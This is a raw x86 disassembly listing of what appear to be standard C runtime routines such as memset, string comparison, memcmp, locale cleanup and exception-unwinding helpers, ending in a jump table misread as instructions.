  427a1a:	push   eax
  427a1b:	push   edi
  427a1c:	push   DWORD PTR [ebp+0x20]
  427a1f:	push   DWORD PTR [ebp-0x3c]
  427a22:	call   0x428616
  427a27:	add    esp,0x18
  427a2a:	mov    esi,eax
  427a2c:	neg    esi
  427a2e:	sbb    esi,esi
  427a30:	neg    esi
  427a32:	jmp    0x427a37
  427a34:	mov    esi,DWORD PTR [ebp-0x48]
  427a37:	cmp    DWORD PTR [ebp-0x38],ebx
  427a3a:	je     0x427a5f
  427a3c:	push   edi
  427a3d:	call   0x425f5a
  427a42:	pop    ecx
  427a43:	jmp    0x427a5f
  427a45:	push   DWORD PTR [ebp+0x1c]
  427a48:	push   DWORD PTR [ebp+0x18]
  427a4b:	push   DWORD PTR [ebp+0x14]
  427a4e:	push   DWORD PTR [ebp+0x10]
  427a51:	push   DWORD PTR [ebp+0xc]
  427a54:	push   DWORD PTR [ebp+0x8]
  427a57:	call   DWORD PTR ds:0x4290ec
  427a5d:	mov    esi,eax
  427a5f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a62:	je     0x427a6d
  427a64:	push   DWORD PTR [ebp-0x34]
  427a67:	call   0x425f5a
  427a6c:	pop    ecx
  427a6d:	mov    eax,esi
  427a6f:	lea    esp,[ebp-0x54]
  427a72:	call   0x42538b
  427a77:	ret    
  427a78:	push   0x1c
  427a7a:	push   0x429e88
  427a7f:	call   0x425350
  427a84:	xor    esi,esi
  427a86:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a8c:	jne    0x427ac3
  427a8e:	lea    eax,[ebp-0x1c]
  427a91:	push   eax
  427a92:	xor    edi,edi
  427a94:	inc    edi
  427a95:	push   edi
  427a96:	push   0x429e5c
  427a9b:	push   edi
  427a9c:	call   DWORD PTR ds:0x4290fc
  427aa2:	test   eax,eax
  427aa4:	je     0x427aae
  427aa6:	mov    DWORD PTR ds:0x45ddc0,edi
  427aac:	jmp    0x427ac3
  427aae:	call   DWORD PTR ds:0x429028
  427ab4:	cmp    eax,0x78
  427ab7:	jne    0x427ac3
  427ab9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ac3:	mov    eax,ds:0x45ddc0
  427ac8:	cmp    eax,0x2
  427acb:	je     0x427bbb
  427ad1:	cmp    eax,esi
  427ad3:	je     0x427bbb
  427ad9:	cmp    eax,0x1
  427adc:	jne    0x427be1
  427ae2:	mov    DWORD PTR [ebp-0x20],esi
  427ae5:	mov    DWORD PTR [ebp-0x24],esi
  427ae8:	cmp    DWORD PTR [ebp+0x18],esi
  427aeb:	jne    0x427af5
  427aed:	mov    eax,ds:0x45ddb4
  427af2:	mov    DWORD PTR [ebp+0x18],eax
  427af5:	push   esi
  427af6:	push   esi
  427af7:	push   DWORD PTR [ebp+0x10]
  427afa:	push   DWORD PTR [ebp+0xc]
  427afd:	xor    eax,eax
  427aff:	cmp    DWORD PTR [ebp+0x20],esi
  427b02:	setne  al
  427b05:	lea    eax,[eax*8+0x1]
  427b0c:	push   eax
  427b0d:	push   DWORD PTR [ebp+0x18]
  427b10:	call   DWORD PTR ds:0x4290f0
  427b16:	mov    edi,eax
  427b18:	mov    DWORD PTR [ebp-0x28],edi
  427b1b:	test   edi,edi
  427b1d:	je     0x427be1
  427b23:	and    DWORD PTR [ebp-0x4],0x0
  427b27:	lea    ebx,[edi+edi*1]
  427b2a:	mov    eax,ebx
  427b2c:	add    eax,0x3
  427b2f:	and    eax,0xfffffffc
  427b32:	call   0x4253a0
  427b37:	mov    DWORD PTR [ebp-0x18],esp
  427b3a:	mov    esi,esp
  427b3c:	mov    DWORD PTR [ebp-0x2c],esi
  427b3f:	push   ebx
  427b40:	push   0x0
  427b42:	push   esi
  427b43:	call   0x427c50
  427b48:	add    esp,0xc
  427b4b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b4f:	jmp    0x427b66
  427b51:	xor    eax,eax
  427b53:	inc    eax
  427b54:	ret    
  427b55:	mov    esp,DWORD PTR [ebp-0x18]
  427b58:	call   0x4287e5
  427b5d:	xor    esi,esi
  427b5f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b63:	mov    edi,DWORD PTR [ebp-0x28]
  427b66:	test   esi,esi
  427b68:	jne    0x427b81
  427b6a:	push   edi
  427b6b:	push   0x2
  427b6d:	call   0x426468
  427b72:	pop    ecx
  427b73:	pop    ecx
  427b74:	mov    esi,eax
  427b76:	test   esi,esi
  427b78:	je     0x427be1
  427b7a:	mov    DWORD PTR [ebp-0x24],0x1
  427b81:	push   edi
  427b82:	push   esi
  427b83:	push   DWORD PTR [ebp+0x10]
  427b86:	push   DWORD PTR [ebp+0xc]
  427b89:	push   0x1
  427b8b:	push   DWORD PTR [ebp+0x18]
  427b8e:	call   DWORD PTR ds:0x4290f0
  427b94:	test   eax,eax
  427b96:	je     0x427ba9
  427b98:	push   DWORD PTR [ebp+0x14]
  427b9b:	push   eax
  427b9c:	push   esi
  427b9d:	push   DWORD PTR [ebp+0x8]
  427ba0:	call   DWORD PTR ds:0x4290fc
  427ba6:	mov    DWORD PTR [ebp-0x20],eax
  427ba9:	cmp    DWORD PTR [ebp-0x24],0x0
  427bad:	je     0x427bb6
  427baf:	push   esi
  427bb0:	call   0x425f5a
  427bb5:	pop    ecx
  427bb6:	mov    eax,DWORD PTR [ebp-0x20]
  427bb9:	jmp    0x427c29
  427bbb:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bbe:	cmp    ebx,esi
  427bc0:	jne    0x427bc8
  427bc2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bc8:	mov    edi,DWORD PTR [ebp+0x18]
  427bcb:	test   edi,edi
  427bcd:	jne    0x427bd5
  427bcf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bd5:	push   ebx
  427bd6:	call   0x4285cd
  427bdb:	pop    ecx
  427bdc:	cmp    eax,0xffffffff
  427bdf:	jne    0x427be5
  427be1:	xor    eax,eax
  427be3:	jmp    0x427c29
  427be5:	cmp    eax,edi
  427be7:	je     0x427c07
  427be9:	push   0x0
  427beb:	push   0x0
  427bed:	lea    ecx,[ebp+0x10]
  427bf0:	push   ecx
  427bf1:	push   DWORD PTR [ebp+0xc]
  427bf4:	push   eax
  427bf5:	push   edi
  427bf6:	call   0x428616
  427bfb:	add    esp,0x18
  427bfe:	mov    esi,eax
  427c00:	test   esi,esi
  427c02:	je     0x427be1
  427c04:	mov    DWORD PTR [ebp+0xc],esi
  427c07:	push   DWORD PTR [ebp+0x14]
  427c0a:	push   DWORD PTR [ebp+0x10]
  427c0d:	push   DWORD PTR [ebp+0xc]
  427c10:	push   DWORD PTR [ebp+0x8]
  427c13:	push   ebx
  427c14:	call   DWORD PTR ds:0x4290f8
  427c1a:	mov    edi,eax
  427c1c:	test   esi,esi
  427c1e:	je     0x427c27
  427c20:	push   esi
  427c21:	call   0x425f5a
  427c26:	pop    ecx
  427c27:	mov    eax,edi
  427c29:	lea    esp,[ebp-0x38]
  427c2c:	call   0x42538b
  427c31:	ret    
  427c32:	mov    eax,ds:0x45ddc4
  427c37:	test   eax,eax
  427c39:	je     0x427c4a
  427c3b:	push   DWORD PTR [esp+0x4]
  427c3f:	call   eax
  427c41:	test   eax,eax
  427c43:	pop    ecx
  427c44:	je     0x427c4a
  427c46:	xor    eax,eax
  427c48:	inc    eax
  427c49:	ret    
  427c4a:	xor    eax,eax
  427c4c:	ret    
  427c4d:	int3   
  427c4e:	int3   
  427c4f:	int3   
  427c50:	mov    edx,DWORD PTR [esp+0xc]
  427c54:	mov    ecx,DWORD PTR [esp+0x4]
  427c58:	test   edx,edx
  427c5a:	je     0x427cab
  427c5c:	xor    eax,eax
  427c5e:	mov    al,BYTE PTR [esp+0x8]
  427c62:	push   edi
  427c63:	mov    edi,ecx
  427c65:	cmp    edx,0x4
  427c68:	jb     0x427c9b
  427c6a:	neg    ecx
  427c6c:	and    ecx,0x3
  427c6f:	je     0x427c7d
  427c71:	sub    edx,ecx
  427c73:	mov    BYTE PTR [edi],al
  427c75:	add    edi,0x1
  427c78:	sub    ecx,0x1
  427c7b:	jne    0x427c73
  427c7d:	mov    ecx,eax
  427c7f:	shl    eax,0x8
  427c82:	add    eax,ecx
  427c84:	mov    ecx,eax
  427c86:	shl    eax,0x10
  427c89:	add    eax,ecx
  427c8b:	mov    ecx,edx
  427c8d:	and    edx,0x3
  427c90:	shr    ecx,0x2
  427c93:	je     0x427c9b
  427c95:	rep stos DWORD PTR es:[edi],eax
  427c97:	test   edx,edx
  427c99:	je     0x427ca5
  427c9b:	mov    BYTE PTR [edi],al
  427c9d:	add    edi,0x1
  427ca0:	sub    edx,0x1
  427ca3:	jne    0x427c9b
  427ca5:	mov    eax,DWORD PTR [esp+0x8]
  427ca9:	pop    edi
  427caa:	ret    
  427cab:	mov    eax,DWORD PTR [esp+0x4]
  427caf:	ret    
  427cb0:	push   esi
  427cb1:	mov    esi,DWORD PTR [esp+0x8]
  427cb5:	test   esi,esi
  427cb7:	je     0x427e3e
  427cbd:	push   DWORD PTR [esi+0x4]
  427cc0:	call   0x425f5a
  427cc5:	push   DWORD PTR [esi+0x8]
  427cc8:	call   0x425f5a
  427ccd:	push   DWORD PTR [esi+0xc]
  427cd0:	call   0x425f5a
  427cd5:	push   DWORD PTR [esi+0x10]
  427cd8:	call   0x425f5a
  427cdd:	push   DWORD PTR [esi+0x14]
  427ce0:	call   0x425f5a
  427ce5:	push   DWORD PTR [esi+0x18]
  427ce8:	call   0x425f5a
  427ced:	push   DWORD PTR [esi]
  427cef:	call   0x425f5a
  427cf4:	push   DWORD PTR [esi+0x20]
  427cf7:	call   0x425f5a
  427cfc:	push   DWORD PTR [esi+0x24]
  427cff:	call   0x425f5a
  427d04:	push   DWORD PTR [esi+0x28]
  427d07:	call   0x425f5a
  427d0c:	push   DWORD PTR [esi+0x2c]
  427d0f:	call   0x425f5a
  427d14:	push   DWORD PTR [esi+0x30]
  427d17:	call   0x425f5a
  427d1c:	push   DWORD PTR [esi+0x34]
  427d1f:	call   0x425f5a
  427d24:	push   DWORD PTR [esi+0x1c]
  427d27:	call   0x425f5a
  427d2c:	push   DWORD PTR [esi+0x38]
  427d2f:	call   0x425f5a
  427d34:	push   DWORD PTR [esi+0x3c]
  427d37:	call   0x425f5a
  427d3c:	add    esp,0x40
  427d3f:	push   DWORD PTR [esi+0x40]
  427d42:	call   0x425f5a
  427d47:	push   DWORD PTR [esi+0x44]
  427d4a:	call   0x425f5a
  427d4f:	push   DWORD PTR [esi+0x48]
  427d52:	call   0x425f5a
  427d57:	push   DWORD PTR [esi+0x4c]
  427d5a:	call   0x425f5a
  427d5f:	push   DWORD PTR [esi+0x50]
  427d62:	call   0x425f5a
  427d67:	push   DWORD PTR [esi+0x54]
  427d6a:	call   0x425f5a
  427d6f:	push   DWORD PTR [esi+0x58]
  427d72:	call   0x425f5a
  427d77:	push   DWORD PTR [esi+0x5c]
  427d7a:	call   0x425f5a
  427d7f:	push   DWORD PTR [esi+0x60]
  427d82:	call   0x425f5a
  427d87:	push   DWORD PTR [esi+0x64]
  427d8a:	call   0x425f5a
  427d8f:	push   DWORD PTR [esi+0x68]
  427d92:	call   0x425f5a
  427d97:	push   DWORD PTR [esi+0x6c]
  427d9a:	call   0x425f5a
  427d9f:	push   DWORD PTR [esi+0x70]
  427da2:	call   0x425f5a
  427da7:	push   DWORD PTR [esi+0x74]
  427daa:	call   0x425f5a
  427daf:	push   DWORD PTR [esi+0x78]
  427db2:	call   0x425f5a
  427db7:	push   DWORD PTR [esi+0x7c]
  427dba:	call   0x425f5a
  427dbf:	add    esp,0x40
  427dc2:	push   DWORD PTR [esi+0x80]
  427dc8:	call   0x425f5a
  427dcd:	push   DWORD PTR [esi+0x84]
  427dd3:	call   0x425f5a
  427dd8:	push   DWORD PTR [esi+0x88]
  427dde:	call   0x425f5a
  427de3:	push   DWORD PTR [esi+0x8c]
  427de9:	call   0x425f5a
  427dee:	push   DWORD PTR [esi+0x90]
  427df4:	call   0x425f5a
  427df9:	push   DWORD PTR [esi+0x94]
  427dff:	call   0x425f5a
  427e04:	push   DWORD PTR [esi+0x98]
  427e0a:	call   0x425f5a
  427e0f:	push   DWORD PTR [esi+0x9c]
  427e15:	call   0x425f5a
  427e1a:	push   DWORD PTR [esi+0xa0]
  427e20:	call   0x425f5a
  427e25:	push   DWORD PTR [esi+0xa4]
  427e2b:	call   0x425f5a
  427e30:	push   DWORD PTR [esi+0xa8]
  427e36:	call   0x425f5a
  427e3b:	add    esp,0x2c
  427e3e:	pop    esi
  427e3f:	ret    
  427e40:	push   esi
  427e41:	mov    esi,DWORD PTR [esp+0x8]
  427e45:	test   esi,esi
  427e47:	je     0x427e9d
  427e49:	mov    eax,DWORD PTR [esi]
  427e4b:	mov    ecx,DWORD PTR ds:0x45d934
  427e51:	cmp    eax,DWORD PTR [ecx]
  427e53:	je     0x427e64
  427e55:	cmp    eax,DWORD PTR ds:0x45d904
  427e5b:	je     0x427e64
  427e5d:	push   eax
  427e5e:	call   0x425f5a
  427e63:	pop    ecx
  427e64:	mov    eax,DWORD PTR [esi+0x4]
  427e67:	mov    ecx,DWORD PTR ds:0x45d934
  427e6d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e70:	je     0x427e81
  427e72:	cmp    eax,DWORD PTR ds:0x45d908
  427e78:	je     0x427e81
  427e7a:	push   eax
  427e7b:	call   0x425f5a
  427e80:	pop    ecx
  427e81:	mov    esi,DWORD PTR [esi+0x8]
  427e84:	mov    eax,ds:0x45d934
  427e89:	cmp    esi,DWORD PTR [eax+0x8]
  427e8c:	je     0x427e9d
  427e8e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e94:	je     0x427e9d
  427e96:	push   esi
  427e97:	call   0x425f5a
  427e9c:	pop    ecx
  427e9d:	pop    esi
  427e9e:	ret    
  427e9f:	push   esi
  427ea0:	mov    esi,DWORD PTR [esp+0x8]
  427ea4:	test   esi,esi
  427ea6:	je     0x427f76
  427eac:	mov    eax,DWORD PTR [esi+0xc]
  427eaf:	mov    ecx,DWORD PTR ds:0x45d934
  427eb5:	cmp    eax,DWORD PTR [ecx+0xc]
  427eb8:	je     0x427ec9
  427eba:	cmp    eax,DWORD PTR ds:0x45d910
  427ec0:	je     0x427ec9
  427ec2:	push   eax
  427ec3:	call   0x425f5a
  427ec8:	pop    ecx
  427ec9:	mov    eax,DWORD PTR [esi+0x10]
  427ecc:	mov    ecx,DWORD PTR ds:0x45d934
  427ed2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ed5:	je     0x427ee6
  427ed7:	cmp    eax,DWORD PTR ds:0x45d914
  427edd:	je     0x427ee6
  427edf:	push   eax
  427ee0:	call   0x425f5a
  427ee5:	pop    ecx
  427ee6:	mov    eax,DWORD PTR [esi+0x14]
  427ee9:	mov    ecx,DWORD PTR ds:0x45d934
  427eef:	cmp    eax,DWORD PTR [ecx+0x14]
  427ef2:	je     0x427f03
  427ef4:	cmp    eax,DWORD PTR ds:0x45d918
  427efa:	je     0x427f03
  427efc:	push   eax
  427efd:	call   0x425f5a
  427f02:	pop    ecx
  427f03:	mov    eax,DWORD PTR [esi+0x18]
  427f06:	mov    ecx,DWORD PTR ds:0x45d934
  427f0c:	cmp    eax,DWORD PTR [ecx+0x18]
  427f0f:	je     0x427f20
  427f11:	cmp    eax,DWORD PTR ds:0x45d91c
  427f17:	je     0x427f20
  427f19:	push   eax
  427f1a:	call   0x425f5a
  427f1f:	pop    ecx
  427f20:	mov    eax,DWORD PTR [esi+0x1c]
  427f23:	mov    ecx,DWORD PTR ds:0x45d934
  427f29:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f2c:	je     0x427f3d
  427f2e:	cmp    eax,DWORD PTR ds:0x45d920
  427f34:	je     0x427f3d
  427f36:	push   eax
  427f37:	call   0x425f5a
  427f3c:	pop    ecx
  427f3d:	mov    eax,DWORD PTR [esi+0x20]
  427f40:	mov    ecx,DWORD PTR ds:0x45d934
  427f46:	cmp    eax,DWORD PTR [ecx+0x20]
  427f49:	je     0x427f5a
  427f4b:	cmp    eax,DWORD PTR ds:0x45d924
  427f51:	je     0x427f5a
  427f53:	push   eax
  427f54:	call   0x425f5a
  427f59:	pop    ecx
  427f5a:	mov    esi,DWORD PTR [esi+0x24]
  427f5d:	mov    eax,ds:0x45d934
  427f62:	cmp    esi,DWORD PTR [eax+0x24]
  427f65:	je     0x427f76
  427f67:	cmp    esi,DWORD PTR ds:0x45d928
  427f6d:	je     0x427f76
  427f6f:	push   esi
  427f70:	call   0x425f5a
  427f75:	pop    ecx
  427f76:	pop    esi
  427f77:	ret    
  427f78:	int3   
  427f79:	int3   
  427f7a:	int3   
  427f7b:	int3   
  427f7c:	int3   
  427f7d:	int3   
  427f7e:	int3   
  427f7f:	int3   
  427f80:	push   ebp
  427f81:	mov    ebp,esp
  427f83:	push   esi
  427f84:	xor    eax,eax
  427f86:	push   eax
  427f87:	push   eax
  427f88:	push   eax
  427f89:	push   eax
  427f8a:	push   eax
  427f8b:	push   eax
  427f8c:	push   eax
  427f8d:	push   eax
  427f8e:	mov    edx,DWORD PTR [ebp+0xc]
  427f91:	lea    ecx,[ecx+0x0]
  427f94:	mov    al,BYTE PTR [edx]
  427f96:	or     al,al
  427f98:	je     0x427fa3
  427f9a:	add    edx,0x1
  427f9d:	bts    DWORD PTR [esp],eax
  427fa1:	jmp    0x427f94
  427fa3:	mov    esi,DWORD PTR [ebp+0x8]
  427fa6:	or     ecx,0xffffffff
  427fa9:	lea    ecx,[ecx+0x0]
  427fac:	add    ecx,0x1
  427faf:	mov    al,BYTE PTR [esi]
  427fb1:	or     al,al
  427fb3:	je     0x427fbe
  427fb5:	add    esi,0x1
  427fb8:	bt     DWORD PTR [esp],eax
  427fbc:	jae    0x427fac
  427fbe:	mov    eax,ecx
  427fc0:	add    esp,0x20
  427fc3:	pop    esi
  427fc4:	leave  
  427fc5:	ret    
  427fc6:	int3   
  427fc7:	int3   
  427fc8:	int3   
  427fc9:	int3   
  427fca:	int3   
  427fcb:	int3   
  427fcc:	int3   
  427fcd:	int3   
  427fce:	int3   
  427fcf:	int3   
  427fd0:	mov    edx,DWORD PTR [esp+0x4]
  427fd4:	mov    ecx,DWORD PTR [esp+0x8]
  427fd8:	test   edx,0x3
  427fde:	jne    0x42801c
  427fe0:	mov    eax,DWORD PTR [edx]
  427fe2:	cmp    al,BYTE PTR [ecx]
  427fe4:	jne    0x428014
  427fe6:	or     al,al
  427fe8:	je     0x428010
  427fea:	cmp    ah,BYTE PTR [ecx+0x1]
  427fed:	jne    0x428014
  427fef:	or     ah,ah
  427ff1:	je     0x428010
  427ff3:	shr    eax,0x10
  427ff6:	cmp    al,BYTE PTR [ecx+0x2]
  427ff9:	jne    0x428014
  427ffb:	or     al,al
  427ffd:	je     0x428010
  427fff:	cmp    ah,BYTE PTR [ecx+0x3]
  428002:	jne    0x428014
  428004:	add    ecx,0x4
  428007:	add    edx,0x4
  42800a:	or     ah,ah
  42800c:	jne    0x427fe0
  42800e:	mov    edi,edi
  428010:	xor    eax,eax
  428012:	ret    
  428013:	nop
  428014:	sbb    eax,eax
  428016:	shl    eax,1
  428018:	add    eax,0x1
  42801b:	ret    
  42801c:	test   edx,0x1
  428022:	je     0x42803c
  428024:	mov    al,BYTE PTR [edx]
  428026:	add    edx,0x1
  428029:	cmp    al,BYTE PTR [ecx]
  42802b:	jne    0x428014
  42802d:	add    ecx,0x1
  428030:	or     al,al
  428032:	je     0x428010
  428034:	test   edx,0x2
  42803a:	je     0x427fe0
  42803c:	mov    ax,WORD PTR [edx]
  42803f:	add    edx,0x2
  428042:	cmp    al,BYTE PTR [ecx]
  428044:	jne    0x428014
  428046:	or     al,al
  428048:	je     0x428010
  42804a:	cmp    ah,BYTE PTR [ecx+0x1]
  42804d:	jne    0x428014
  42804f:	or     ah,ah
  428051:	je     0x428010
  428053:	add    ecx,0x2
  428056:	jmp    0x427fe0
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	mov    eax,DWORD PTR [esp+0xc]
  428064:	test   eax,eax
  428066:	je     0x4280b2
  428068:	mov    edx,DWORD PTR [esp+0x4]
  42806c:	push   esi
  42806d:	push   edi
  42806e:	mov    esi,edx
  428070:	mov    edi,DWORD PTR [esp+0x10]
  428074:	or     edx,edi
  428076:	and    edx,0x3
  428079:	je     0x4280b3
  42807b:	test   eax,0x1
  428080:	je     0x428093
  428082:	mov    cl,BYTE PTR [esi]
  428084:	cmp    cl,BYTE PTR [edi]
  428086:	jne    0x4280e0
  428088:	add    esi,0x1
  42808b:	add    edi,0x1
  42808e:	sub    eax,0x1
  428091:	je     0x4280b0
  428093:	mov    cl,BYTE PTR [esi]
  428095:	mov    dl,BYTE PTR [edi]
  428097:	cmp    cl,dl
  428099:	jne    0x4280e0
  42809b:	mov    cl,BYTE PTR [esi+0x1]
  42809e:	mov    dl,BYTE PTR [edi+0x1]
  4280a1:	cmp    cl,dl
  4280a3:	jne    0x4280e0
  4280a5:	add    edi,0x2
  4280a8:	add    esi,0x2
  4280ab:	sub    eax,0x2
  4280ae:	jne    0x428093
  4280b0:	pop    edi
  4280b1:	pop    esi
  4280b2:	ret    
  4280b3:	mov    ecx,eax
  4280b5:	and    eax,0x3
  4280b8:	shr    ecx,0x2
  4280bb:	je     0x4280e8
  4280bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280bf:	je     0x4280e8
  4280c1:	mov    ecx,DWORD PTR [esi-0x4]
  4280c4:	mov    edx,DWORD PTR [edi-0x4]
  4280c7:	cmp    cl,dl
  4280c9:	jne    0x4280db
  4280cb:	cmp    ch,dh
  4280cd:	jne    0x4280db
  4280cf:	shr    ecx,0x10
  4280d2:	shr    edx,0x10
  4280d5:	cmp    cl,dl
  4280d7:	jne    0x4280db
  4280d9:	cmp    ch,dh
  4280db:	mov    eax,0x0
  4280e0:	sbb    eax,eax
  4280e2:	pop    edi
  4280e3:	sbb    eax,0xffffffff
  4280e6:	pop    esi
  4280e7:	ret    
  4280e8:	test   eax,eax
  4280ea:	je     0x4280b0
  4280ec:	mov    edx,DWORD PTR [esi]
  4280ee:	mov    ecx,DWORD PTR [edi]
  4280f0:	cmp    dl,cl
  4280f2:	jne    0x4280db
  4280f4:	sub    eax,0x1
  4280f7:	je     0x428115
  4280f9:	cmp    dh,ch
  4280fb:	jne    0x4280db
  4280fd:	sub    eax,0x1
  428100:	je     0x428115
  428102:	and    ecx,0xff0000
  428108:	and    edx,0xff0000
  42810e:	cmp    edx,ecx
  428110:	jne    0x4280db
  428112:	sub    eax,0x1
  428115:	pop    edi
  428116:	pop    esi
  428117:	ret    
  428118:	int3   
  428119:	int3   
  42811a:	int3   
  42811b:	int3   
  42811c:	int3   
  42811d:	int3   
  42811e:	int3   
  42811f:	int3   
  428120:	push   ebp
  428121:	mov    ebp,esp
  428123:	push   edi
  428124:	push   esi
  428125:	push   ebx
  428126:	mov    ecx,DWORD PTR [ebp+0x10]
  428129:	jecxz  0x428152
  42812b:	mov    ebx,ecx
  42812d:	mov    edi,DWORD PTR [ebp+0x8]
  428130:	mov    esi,edi
  428132:	xor    eax,eax
  428134:	repnz scas al,BYTE PTR es:[edi]
  428136:	neg    ecx
  428138:	add    ecx,ebx
  42813a:	mov    edi,esi
  42813c:	mov    esi,DWORD PTR [ebp+0xc]
  42813f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428141:	mov    al,BYTE PTR [esi-0x1]
  428144:	xor    ecx,ecx
  428146:	cmp    al,BYTE PTR [edi-0x1]
  428149:	ja     0x428150
  42814b:	je     0x428152
  42814d:	sub    ecx,0x2
  428150:	not    ecx
  428152:	mov    eax,ecx
  428154:	pop    ebx
  428155:	pop    esi
  428156:	pop    edi
  428157:	leave  
  428158:	ret    
  428159:	int3   
  42815a:	int3   
  42815b:	int3   
  42815c:	int3   
  42815d:	int3   
  42815e:	int3   
  42815f:	int3   
  428160:	push   ebp
  428161:	mov    ebp,esp
  428163:	push   esi
  428164:	xor    eax,eax
  428166:	push   eax
  428167:	push   eax
  428168:	push   eax
  428169:	push   eax
  42816a:	push   eax
  42816b:	push   eax
  42816c:	push   eax
  42816d:	push   eax
  42816e:	mov    edx,DWORD PTR [ebp+0xc]
  428171:	lea    ecx,[ecx+0x0]
  428174:	mov    al,BYTE PTR [edx]
  428176:	or     al,al
  428178:	je     0x428183
  42817a:	add    edx,0x1
  42817d:	bts    DWORD PTR [esp],eax
  428181:	jmp    0x428174
  428183:	mov    esi,DWORD PTR [ebp+0x8]
  428186:	mov    edi,edi
  428188:	mov    al,BYTE PTR [esi]
  42818a:	or     al,al
  42818c:	je     0x42819a
  42818e:	add    esi,0x1
  428191:	bt     DWORD PTR [esp],eax
  428195:	jae    0x428188
  428197:	lea    eax,[esi-0x1]
  42819a:	add    esp,0x20
  42819d:	pop    esi
  42819e:	leave  
  42819f:	ret    
  4281a0:	push   ebp
  4281a1:	mov    ebp,esp
  4281a3:	push   ebx
  4281a4:	push   esi
  4281a5:	push   edi
  4281a6:	push   ebp
  4281a7:	push   0x0
  4281a9:	push   0x0
  4281ab:	push   0x4281b8
  4281b0:	push   DWORD PTR [ebp+0x8]
  4281b3:	call   0x428c2e
  4281b8:	pop    ebp
  4281b9:	pop    edi
  4281ba:	pop    esi
  4281bb:	pop    ebx
  4281bc:	mov    esp,ebp
  4281be:	pop    ebp
  4281bf:	ret    
  4281c0:	mov    ecx,DWORD PTR [esp+0x4]
  4281c4:	test   DWORD PTR [ecx+0x4],0x6
  4281cb:	mov    eax,0x1
  4281d0:	je     0x4281e1
  4281d2:	mov    eax,DWORD PTR [esp+0x8]
  4281d6:	mov    edx,DWORD PTR [esp+0x10]
  4281da:	mov    DWORD PTR [edx],eax
  4281dc:	mov    eax,0x3
  4281e1:	ret    
  4281e2:	push   ebx
  4281e3:	push   esi
  4281e4:	push   edi
  4281e5:	mov    eax,DWORD PTR [esp+0x10]
  4281e9:	push   eax
  4281ea:	push   0xfffffffe
  4281ec:	push   0x4281c0
  4281f1:	push   DWORD PTR fs:0x0
  4281f8:	mov    DWORD PTR fs:0x0,esp
  4281ff:	mov    eax,DWORD PTR [esp+0x20]
  428203:	mov    ebx,DWORD PTR [eax+0x8]
  428206:	mov    esi,DWORD PTR [eax+0xc]
  428209:	cmp    esi,0xffffffff
  42820c:	je     0x42823c
  42820e:	cmp    esi,DWORD PTR [esp+0x24]
  428212:	je     0x42823c
  428214:	lea    esi,[esi+esi*2]
  428217:	mov    ecx,DWORD PTR [ebx+esi*4]
  42821a:	mov    DWORD PTR [esp+0x8],ecx
  42821e:	mov    DWORD PTR [eax+0xc],ecx
  428221:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428226:	jne    0x42823a
  428228:	push   0x101
  42822d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428231:	call   0x428276
  428236:	call   DWORD PTR [ebx+esi*4+0x8]
  42823a:	jmp    0x4281ff
  42823c:	pop    DWORD PTR fs:0x0
  428243:	add    esp,0xc
  428246:	pop    edi
  428247:	pop    esi
  428248:	pop    ebx
  428249:	ret    
  42824a:	xor    eax,eax
  42824c:	mov    ecx,DWORD PTR fs:0x0
  428253:	cmp    DWORD PTR [ecx+0x4],0x4281c0
  42825a:	jne    0x42826c
  42825c:	mov    edx,DWORD PTR [ecx+0xc]
  42825f:	mov    edx,DWORD PTR [edx+0xc]
  428262:	cmp    DWORD PTR [ecx+0x8],edx
  428265:	jne    0x42826c
  428267:	mov    eax,0x1
  42826c:	ret    
  42826d:	push   ebx
  42826e:	push   ecx
  42826f:	mov    ebx,0x45d94c
  428274:	jmp    0x428280
  428276:	push   ebx
  428277:	push   ecx
  428278:	mov    ebx,0x45d94c
  42827d:	mov    ecx,DWORD PTR [ebp+0x8]
  428280:	mov    DWORD PTR [ebx+0x8],ecx
  428283:	mov    DWORD PTR [ebx+0x4],eax
  428286:	mov    DWORD PTR [ebx+0xc],ebp
  428289:	pop    ecx
  42828a:	pop    ebx
  42828b:	ret    0x4
  42828e:	int3   
  42828f:	int3   
  428290:	push   ebp
  428291:	mov    ebp,esp
  428293:	push   edi
  428294:	push   esi
  428295:	mov    esi,DWORD PTR [ebp+0xc]
  428298:	mov    ecx,DWORD PTR [ebp+0x10]
  42829b:	mov    edi,DWORD PTR [ebp+0x8]
  42829e:	mov    eax,ecx
  4282a0:	mov    edx,ecx
  4282a2:	add    eax,esi
  4282a4:	cmp    edi,esi
  4282a6:	jbe    0x4282b0
  4282a8:	cmp    edi,eax
  4282aa:	jb     0x42842c
  4282b0:	test   edi,0x3
  4282b6:	jne    0x4282cc
  4282b8:	shr    ecx,0x2
  4282bb:	and    edx,0x3
  4282be:	cmp    ecx,0x8
  4282c1:	jb     0x4282ec
  4282c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282c5:	jmp    DWORD PTR [edx*4+0x4283dc]
  4282cc:	mov    eax,edi
  4282ce:	mov    edx,0x3
  4282d3:	sub    ecx,0x4
  4282d6:	jb     0x4282e4
  4282d8:	and    eax,0x3
  4282db:	add    ecx,eax
  4282dd:	jmp    DWORD PTR [eax*4+0x4282f0]
  4282e4:	jmp    DWORD PTR [ecx*4+0x4283ec]
  4282eb:	nop
  4282ec:	jmp    DWORD PTR [ecx*4+0x428370]
  4282f3:	nop
  4282f4:	add    BYTE PTR [ebx-0x7cd3ffbe],al
  4282fa:	inc    edx
  4282fb:	add    BYTE PTR [eax-0x7d],dl
  4282fe:	inc    edx
  4282ff:	add    BYTE PTR [ebx],ah
  428301:	ror    DWORD PTR [edx-0x75f877fa],1
  428307:	inc    esi
